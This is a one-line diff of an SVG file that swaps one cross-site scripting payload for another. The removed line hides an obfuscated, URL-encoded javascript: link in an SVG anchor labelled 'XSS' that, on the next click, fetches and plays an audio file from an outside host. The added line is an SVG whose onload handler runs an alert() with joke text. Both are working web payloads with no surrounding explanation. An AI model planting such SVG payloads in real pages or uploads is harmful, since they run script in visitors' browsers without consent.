@@ -1,1 +1,1 @@
-<svg xlink:href="javascript:window.onclick%3Dfunction%28%29%7Bwindow.onclick%20%3D%20null%3Bvar%20audio%20%3D%20new%20Audio%28https%3A%2F%2Fuhwot.github.io%2Ffiles%2FFUCKBEES_FULL.mp3%29%3Baudio.play%28%29%3B%7D%3B"><a xlink:href="javascript:window.onclick%3Dfunction%28%29%7Bwindow.onclick%20%3D%20null%3Bvar%20audio%20%3D%20new%20Audio%28https%3A%2F%2Fuhwot.github.io%2Ffiles%2FFUCKBEES_FULL.mp3%29%3Baudio.play%28%29%3B%7D%3B"><text x="20" y="20">XSS</text></a>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(haha rajidd securitee bed)"/>
